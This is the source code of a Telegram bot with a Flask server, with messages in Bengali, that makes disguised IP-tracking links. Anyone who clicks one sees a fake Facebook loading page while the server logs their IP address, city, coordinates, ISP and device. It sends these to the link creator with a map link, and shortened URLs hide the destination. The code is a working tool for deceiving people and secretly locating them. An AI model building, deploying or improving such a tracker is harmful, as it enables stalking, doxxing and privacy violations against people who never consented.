import os
import threading
import secrets
import sqlite3
import requests
import telebot
from flask import Flask, request, redirect
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from datetime import datetime

# ===================== CONFIG =====================
BOT_TOKEN = os.environ.get("BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")
BASE_URL   = os.environ.get("BASE_URL",  "https://ip-eb0c.onrender.com")
# BASE_URL = Render এ deploy করার পর যে URL পাবে সেটা

bot = telebot.TeleBot(BOT_TOKEN)
app = Flask(__name__)

# ===================== DATABASE =====================
def init_db():
    conn = sqlite3.connect("tracker.db", check_same_thread=False)
    c = conn.cursor()
    c.execute("""
        CREATE TABLE IF NOT EXISTS links (
            token   TEXT PRIMARY KEY,
            user_id INTEGER,
            name    TEXT,
            clicks  INTEGER DEFAULT 0,
            created TEXT
        )
    """)
    c.execute("""
        CREATE TABLE IF NOT EXISTS logs (
            id      INTEGER PRIMARY KEY AUTOINCREMENT,
            token   TEXT,
            ip      TEXT,
            country TEXT,
            city    TEXT,
            region  TEXT,
            isp     TEXT,
            lat     TEXT,
            lon     TEXT,
            device  TEXT,
            ua      TEXT,
            time    TEXT
        )
    """)
    conn.commit()
    conn.close()

init_db()

def get_db():
    conn = sqlite3.connect("tracker.db", check_same_thread=False)
    conn.row_factory = sqlite3.Row
    return conn

# ===================== FLASK — Tracking Server =====================

FAKE_PAGE = """<!DOCTYPE html>
<html lang="bn">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Facebook</title>
  <link rel="icon" href="https://www.facebook.com/favicon.ico">
  <style>
    * {{ margin:0; padding:0; box-sizing:border-box; }}
    body {{
      background: #f0f2f5;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
      font-family: Helvetica, Arial, sans-serif;
    }}
    .loader-box {{
      text-align: center;
    }}
    .fb-logo {{
      color: #1877f2;
      font-size: 52px;
      font-weight: 900;
      letter-spacing: -2px;
      margin-bottom: 30px;
    }}
    .spinner {{
      width: 36px;
      height: 36px;
      border: 4px solid #ddd;
      border-top: 4px solid #1877f2;
      border-radius: 50%;
      animation: spin 0.8s linear infinite;
      margin: 0 auto;
    }}
    @keyframes spin {{ to {{ transform: rotate(360deg); }} }}
  </style>
</head>
<body>
  <div class="loader-box">
    <div class="fb-logo">facebook</div>
    <div class="spinner"></div>
  </div>
  <script>
    setTimeout(() => window.location.href = "{redirect}", 800);
  </script>
</body>
</html>"""

@app.route("/")
def home():
    return "🤖 IP Tracker Bot is Alive!", 200

@app.route("/t/<token>")
def track(token):
    # ✅ Real IP — Render.com X-Forwarded-For header থেকে
    forwarded = request.headers.get("X-Forwarded-For", "")
    if forwarded:
        ip = forwarded.split(",")[0].strip()
    else:
        ip = request.remote_addr or "Unknown"

    ua = request.headers.get("User-Agent", "Unknown")
    redirect_to = request.args.get("r", "https://www.facebook.com")

    # Location নাও
    country = city = region = isp = lat = lon = "অজানা"
    try:
        loc = requests.get(f"http://ip-api.com/json/{ip}?lang=en", timeout=5).json()
        if loc.get("status") == "success":
            country = loc.get("country",    "অজানা")
            city    = loc.get("city",        "অজানা")
            region  = loc.get("regionName",  "অজানা")
            isp     = loc.get("isp",         "অজানা")
            lat     = str(loc.get("lat",     ""))
            lon     = str(loc.get("lon",     ""))
    except:
        pass

    # Device detect
    ua_l   = ua.lower()
    device = "💻 Desktop"
    if "android" in ua_l:
        device = "📱 Android"
    elif "iphone" in ua_l or "ipad" in ua_l:
        device = "🍎 iPhone/iPad"
    elif "mobile" in ua_l:
        device = "📱 Mobile"

    now = datetime.now().strftime("%d %b %Y, %I:%M %p")

    # DB থেকে owner নাও
    db   = get_db()
    row  = db.execute("SELECT user_id, name FROM links WHERE token=?", (token,)).fetchone()

    if row:
        user_id   = row["user_id"]
        link_name = row["name"]

        # Click count বাড়াও
        db.execute("UPDATE links SET clicks=clicks+1 WHERE token=?", (token,))

        # Log করো
        db.execute("""
            INSERT INTO logs (token,ip,country,city,region,isp,lat,lon,device,ua,time)
            VALUES (?,?,?,?,?,?,?,?,?,?,?)
        """, (token, ip, country, city, region, isp, lat, lon, device, ua[:200], now))
        db.commit()

        # Maps link
        maps = f"https://maps.google.com/?q={lat},{lon}" if lat != "অজানা" else None

        # Notification message
        msg = (
            f"🚨 *কেউ তোমার লিংকে ক্লিক করেছে!*\n\n"
            f"🔗 লিংক: `{link_name}`\n"
            f"📅 সময়: {now}\n\n"
            f"━━━━━━━━━━━━━━━\n"
            f"🌐 *IP:* `{ip}`\n"
            f"🌍 দেশ: {country}\n"
            f"🏙️ শহর: {city}\n"
            f"📍 অঞ্চল: {region}\n"
            f"📡 ISP: {isp}\n"
            f"📌 Coordinates: {lat}, {lon}\n"
            f"━━━━━━━━━━━━━━━\n"
            f"{device}\n"
        )

        markup = InlineKeyboardMarkup()
        if maps:
            markup.add(InlineKeyboardButton("🗺️ Google Maps এ দেখো", url=maps))
        markup.add(InlineKeyboardButton("📋 সব Clicks দেখো", callback_data=f"logs_{token}"))

        try:
            bot.send_message(user_id, msg, parse_mode="Markdown", reply_markup=markup)
        except:
            pass

    db.close()

    return FAKE_PAGE.replace("{redirect}", redirect_to), 200

# ===================== BOT COMMANDS =====================

def main_menu():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("🔗 নতুন লিংক বানাও", callback_data="new_link"),
        InlineKeyboardButton("📋 আমার লিংক গুলো",  callback_data="my_links"),
        InlineKeyboardButton("❓ কীভাবে কাজ করে?", callback_data="how_to"),
        InlineKeyboardButton("📊 Statistics",        callback_data="stats"),
    )
    return markup

@bot.message_handler(commands=["start"])
def cmd_start(m):
    name = m.from_user.first_name or "বন্ধু"
    bot.send_message(
        m.chat.id,
        f"👋 স্বাগতম *{name}*!\n\n"
        "🔍 *IP Tracker Bot*\n\n"
        "এই বট দিয়ে ট্র্যাকিং লিংক বানাও।\n"
        "যে লিংকে ক্লিক করবে তার\n"
        "*IP, শহর, দেশ, ISP, Device* — সব আসবে!\n\n"
        "👇 নিচের বাটন চাপো",
        parse_mode="Markdown",
        reply_markup=main_menu()
    )

@bot.message_handler(commands=["track"])
def cmd_track(m):
    parts = m.text.split(None, 1)
    name  = parts[1].strip() if len(parts) > 1 else None

    if not name:
        msg = bot.send_message(
            m.chat.id,
            "📌 লিংকের একটা নাম দাও:\n"
            "_(যেমন: বন্ধুর লিংক, অফার লিংক)_",
            parse_mode="Markdown"
        )
        bot.register_next_step_handler(msg, create_link)
        return

    create_link_with_name(m.chat.id, m.from_user.id, name)

def create_link(m):
    create_link_with_name(m.chat.id, m.from_user.id, m.text.strip())

def create_link_with_name(chat_id, user_id, name):
    token = secrets.token_urlsafe(10)
    now   = datetime.now().strftime("%d %b %Y")

    db = get_db()
    db.execute(
        "INSERT INTO links (token, user_id, name, clicks, created) VALUES (?,?,?,0,?)",
        (token, user_id, name, now)
    )
    db.commit()
    db.close()

    link = f"{BASE_URL}/t/{token}"

    # Short link
    short = link
    try:
        r = requests.get(f"https://is.gd/create.php?format=simple&url={requests.utils.quote(link)}", timeout=5)
        if r.text.startswith("http") and len(r.text) < 40:
            short = r.text.strip()
    except:
        pass

    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("📋 আমার সব লিংক",    callback_data="my_links"),
        InlineKeyboardButton("🔗 নতুন লিংক",        callback_data="new_link"),
        InlineKeyboardButton("🗑️ এই লিংক মুছো",     callback_data=f"del_{token}"),
        InlineKeyboardButton("📊 Clicks দেখো",       callback_data=f"logs_{token}"),
    )

    bot.send_message(
        chat_id,
        f"✅ *ট্র্যাকিং লিংক রেডি!*\n\n"
        f"📌 নাম: `{name}`\n\n"
        f"🔗 লিংক:\n`{short}`\n\n"
        f"এই লিংক যাকে পাঠাবে, সে ক্লিক করলেই\n"
        f"তার IP ও Location তোমার কাছে আসবে! 🎯\n\n"
        f"💡 লিংক দেখতে Facebook এর মতো লোড হবে",
        parse_mode="Markdown",
        reply_markup=markup
    )

@bot.message_handler(commands=["mylinks"])
def cmd_mylinks(m):
    show_links(m.chat.id, m.from_user.id)

def show_links(chat_id, user_id):
    db   = get_db()
    rows = db.execute(
        "SELECT token, name, clicks, created FROM links WHERE user_id=? ORDER BY rowid DESC",
        (user_id,)
    ).fetchall()
    db.close()

    if not rows:
        bot.send_message(
            chat_id,
            "❌ এখনো কোনো লিংক নেই।\n/track দিয়ে বানাও!",
            reply_markup=main_menu()
        )
        return

    msg = "📋 *তোমার ট্র্যাকিং লিংক গুলো:*\n\n"
    markup = InlineKeyboardMarkup(row_width=2)

    for row in rows:
        link = f"{BASE_URL}/t/{row['token']}"
        msg += (
            f"🔗 *{row['name']}*\n"
            f"👆 Clicks: {row['clicks']}  |  📅 {row['created']}\n"
            f"`{link}`\n\n"
        )
        markup.add(
            InlineKeyboardButton(f"📊 {row['name'][:12]} Logs", callback_data=f"logs_{row['token']}"),
            InlineKeyboardButton(f"🗑️ মুছো",                    callback_data=f"del_{row['token']}"),
        )

    markup.add(InlineKeyboardButton("🔙 Main Menu", callback_data="menu"))
    bot.send_message(chat_id, msg, parse_mode="Markdown", reply_markup=markup)

# ===================== CALLBACK HANDLER =====================
@bot.callback_query_handler(func=lambda c: True)
def callbacks(c):
    d   = c.data
    uid = c.from_user.id
    cid = c.message.chat.id

    bot.answer_callback_query(c.id)

    if d == "menu":
        bot.send_message(cid, "👇 Main Menu:", reply_markup=main_menu())

    elif d == "new_link":
        msg = bot.send_message(cid, "📌 লিংকের নাম দাও:")
        bot.register_next_step_handler(msg, create_link)

    elif d == "my_links":
        show_links(cid, uid)

    elif d == "how_to":
        bot.send_message(
            cid,
            "❓ *কীভাবে কাজ করে?*\n\n"
            "1️⃣ /track দাও\n"
            "2️⃣ লিংকের নাম দাও\n"
            "3️⃣ বট একটা ট্র্যাকিং লিংক দেবে\n"
            "4️⃣ সেই লিংক যে কাউকে পাঠাও\n"
            "5️⃣ ক্লিক করলেই তার *IP, শহর, দেশ, ISP* সব আসবে!\n\n"
            "⚠️ VPN থাকলে real location পাওয়া যাবে না।\n"
            "⚠️ শুধু নিজের উদ্দেশ্যে ব্যবহার করো।",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup().add(
                InlineKeyboardButton("🔙 Back", callback_data="menu")
            )
        )

    elif d == "stats":
        db   = get_db()
        total_links  = db.execute("SELECT COUNT(*) FROM links WHERE user_id=?",  (uid,)).fetchone()[0]
        total_clicks = db.execute(
            "SELECT COALESCE(SUM(clicks),0) FROM links WHERE user_id=?", (uid,)
        ).fetchone()[0]
        today = datetime.now().strftime("%d %b %Y")
        today_clicks = db.execute(
            "SELECT COUNT(*) FROM logs l JOIN links lk ON l.token=lk.token WHERE lk.user_id=? AND l.time LIKE ?",
            (uid, f"%{today}%")
        ).fetchone()[0]
        db.close()

        bot.send_message(
            cid,
            f"📊 *তোমার Statistics:*\n\n"
            f"🔗 মোট লিংক: {total_links}\n"
            f"👆 মোট Clicks: {total_clicks}\n"
            f"📅 আজকের Clicks: {today_clicks}",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup().add(
                InlineKeyboardButton("🔙 Back", callback_data="menu")
            )
        )

    elif d.startswith("logs_"):
        token = d[5:]
        db    = get_db()
        link  = db.execute("SELECT name, clicks FROM links WHERE token=? AND user_id=?", (token, uid)).fetchone()
        logs  = db.execute(
            "SELECT ip, country, city, isp, device, time FROM logs WHERE token=? ORDER BY id DESC LIMIT 10",
            (token,)
        ).fetchall()
        db.close()

        if not link:
            bot.send_message(cid, "❌ লিংক পাওয়া যায়নি।")
            return

        msg = f"📊 *{link['name']}* — {link['clicks']} Clicks\n\n"
        if not logs:
            msg += "এখনো কোনো click নেই।"
        else:
            for i, log in enumerate(logs, 1):
                msg += (
                    f"*{i}.* `{log['ip']}`\n"
                    f"   🌍 {log['country']} | 🏙️ {log['city']}\n"
                    f"   {log['device']} | 📅 {log['time']}\n\n"
                )

        bot.send_message(
            cid, msg, parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup().add(
                InlineKeyboardButton("🔙 Back", callback_data="my_links")
            )
        )

    elif d.startswith("del_"):
        token = d[4:]
        db    = get_db()
        db.execute("DELETE FROM links WHERE token=? AND user_id=?", (token, uid))
        db.execute("DELETE FROM logs WHERE token=?", (token,))
        db.commit()
        db.close()
        bot.send_message(cid, "🗑️ লিংক মুছে দেওয়া হয়েছে!", reply_markup=main_menu())

# ===================== RUN =====================
def run_flask():
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port)

if __name__ == "__main__":
    threading.Thread(target=run_flask, daemon=True).start()
    print("🤖 Bot Starting...")
    bot.infinity_polling()
